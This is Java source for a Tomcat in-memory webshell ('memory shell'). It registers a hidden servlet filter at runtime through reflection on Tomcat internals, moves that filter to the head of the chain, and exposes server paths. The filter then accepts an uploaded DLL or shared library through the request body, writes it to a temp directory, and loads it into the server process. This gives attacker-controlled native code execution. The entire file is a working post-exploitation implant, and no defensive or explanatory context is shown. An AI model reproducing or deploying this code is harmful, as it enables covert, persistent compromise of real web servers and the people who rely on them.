package com.summersec.x;

import com.sun.glass.utils.NativeLibLoader;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EnumSet;
import java.util.Random;
import java.util.Scanner;

/**
 * @ClassName: AddDllFilter
 * @Description: TODO
 * @Author: Summer
 * @Date: 2022/1/18 12:08
 * @Version: v1.0.0
 * @Description:
 **/
public class AddDllFilter extends ClassLoader implements Filter{
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String path = "/favicondemo.ico";

    public AddDllFilter() {
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.path = this.request.getHeader("path");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addFilter());
        } catch (Exception var7) {
            output.append("error:" + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public String addFilter() throws Exception {
        ServletContext servletContext = this.request.getServletContext();
        Filter filter = this;
        String filterName = this.path;
        String url = this.path;
        if (servletContext.getFilterRegistration(filterName) == null) {
            Field contextField = null;
            ApplicationContext applicationContext = null;
            StandardContext standardContext = null;
            Field stateField = null;
            FilterRegistration.Dynamic filterRegistration = null;

            String var11;
            try {
                contextField = servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (ApplicationContext)contextField.get(servletContext);
                contextField = applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext = (StandardContext)contextField.get(applicationContext);
                stateField = LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, LifecycleState.STARTING_PREP);
                filterRegistration = servletContext.addFilter(filterName, filter);
                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext, (Object[])null);
                stateField.set(standardContext, LifecycleState.STARTED);
                var11 = null;

                Class filterMap;
                try {
                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                } catch (Exception var21) {
                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
                }

                Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
                Object[] filterMaps = (Object[])((Object[])findFilterMaps.invoke(standardContext));

                for(int i = 0; i < filterMaps.length; ++i) {
                    Object filterMapObj = filterMaps[i];
                    findFilterMaps = filterMap.getMethod("getFilterName");
                    String name = (String)findFilterMaps.invoke(filterMapObj);
                    if (name.equalsIgnoreCase(filterName)) {
                        filterMaps[i] = filterMaps[0];
                        filterMaps[0] = filterMapObj;
                    }
                }

                String var25 = "Success";
                return var25;
            } catch (Exception var22) {
                var11 = var22.getMessage();
            } finally {
                stateField.set(standardContext, LifecycleState.STARTED);
            }

            return var11;
        } else {
            return "Filter already exists";
        }
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    static String[] concat(String[] a,String[] b){
        String[] c=new String[a.length+b.length];
        System.arraycopy(a,0,c,0,a.length);
        System.arraycopy(b,0,c,a.length,b.length);
        return c;
    }

    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        String webrootpath=req.getServletContext().getRealPath("/");
        String webjsppath=req.getServletPath();
        String midilepath=(new File(".").getAbsolutePath());
        PrintWriter out = resp.getWriter();
        out.println("WebRootPath:");
        out.println(webrootpath);
        out.println("ServletPath:");
        out.println(webjsppath);
        out.println("WebServerPath:");
        out.println(midilepath);
        try {
            boolean flag = false;
            String fp = req.getParameter("up");

            try {
                if (fp != null) {
                    Random random = new Random(System.currentTimeMillis());
                    String os = System.getProperty("os.name").toLowerCase();
                    if (os.contains("windows")){
                        if (fp.contains("nat")){
                            String java = System.getProperty("java.home");
                            String f = ".." + File.separator;
                            fp = java +f+f+f+f+f+f+f+f+f+f+f +"temp/dm" + random.nextInt(10000000) + "1.dll";
                        }else {
                            fp = "C:/Windows/temp/dm"+ random.nextInt(10000000) + "1.dll";
                        }
                    }else {
                        fp = "/tmp/dm"+ random.nextInt(10000000) + "1.dll";
                    }
                    File file = new File(fp);
                    if (file.exists()){
                        out.println("file is exists!");
                    }else {
                        FileOutputStream fos = new FileOutputStream(file);
                        InputStream inputStream = req.getInputStream();
                        byte temp[] = new byte[1024];
                        int size = -1;
                        while ((size = inputStream.read(temp)) != -1) { // 循环读取
                            fos.write(temp, 0, size);
                        }
                        fos.flush();
                        fos.close();
                        fp = file.getAbsolutePath();
                        flag = true;
                        out.println("dll is uploaded!!!");
                    }
                }
            }catch (Exception e){}
            out.println("dll location is " + fp);
            String delpath = null;
            if (flag){
                delpath = fp;
            }else {
                delpath = req.getHeader("DelPath");
            }
            if (!delpath.isEmpty()){
                try {
                    if (flag){
                        Runtime.getRuntime().load(delpath);
                        out.println(delpath + "dll is load!!!");
                        flag =false;
                    }
                    if (flag){
                        System.load(delpath);
                        out.println(delpath + "dll is load!!!");
                        flag = false;
                    }
                }catch (Exception e){
                    try {
                        NativeLibLoader.loadLibrary(delpath);
                        out.println(delpath + "dll is load!!!");
                        flag = false;
                    }catch (Exception e1){
                        out.println(e1);
                    }
                }
                if (flag) {
                    out.println(delpath + "dll load is failed!!!");
                }

            }
        }catch (Exception e2){
            out.println(e2);
        }
        out.println("if dll  will be auto load in uploading !!!");
        out.flush();
        out.close();


    }

    public void destroy() {
    }
}
